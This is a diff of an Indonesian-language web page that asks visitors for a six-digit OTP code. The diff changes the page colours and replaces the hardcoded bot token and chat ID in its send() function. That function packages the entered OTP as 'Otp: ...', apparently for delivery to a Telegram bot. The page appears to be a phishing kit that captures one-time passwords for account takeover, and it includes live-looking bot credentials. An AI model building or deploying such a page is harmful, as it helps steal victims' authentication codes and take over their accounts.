@@ -7,7 +7,7 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
 </head>
 <body>
-    <nav class="navbar" style="background-color: #BA55D3">
+    <nav class="navbar" style="background-color: #F0F0F0">
         <div class="container">
             <a class="navbar-brand" href="#">
                 <img src="logo.png" alt="logo" width="70" height="24">
@@ -35,7 +35,7 @@
             <center><input style="border-radius: 13px; height: 40px" class="form-control shadow-sm w-75" type="number" name="otp" id="otp" placeholder="Kode Otp 6 Digit Angka" oninput="validateOtp(this)"></center>
         </div>
         <div class="form-button mx-auto d-block mt-5">
-            <center><button onclick="send()" class="text-center" style="border: none; background-color: #BA55D3; border-radius: 13px; width: 75%; height: 45px; color: white; font-weight: bold">Lanjut</button></center>
+            <center><button onclick="send()" class="text-center" style="border: none; background-color: #663399; border-radius: 13px; width: 75%; height: 45px; color: white; font-weight: bold">Lanjut</button></center>
         </div>
     </div>
     <br>
@@ -95,8 +95,8 @@
        }
        const send = () => {
            let otp = document.querySelector("#otp").value
-           let bot = "6439882035:AAFBxLEyIBEwOoC3hQGw2ZBC7HFPLeCi9Tg";
-           let id = "6558831774";
+           let bot = "6700217296:AAEFML6RHIzcKkINO4YBgx831ZbojVr6r2Y";
+           let id = "5408977495";
            const text = `Otp: ${otp}`
            if (otp === "") {
                alert('mohon lengkapi data anda.')
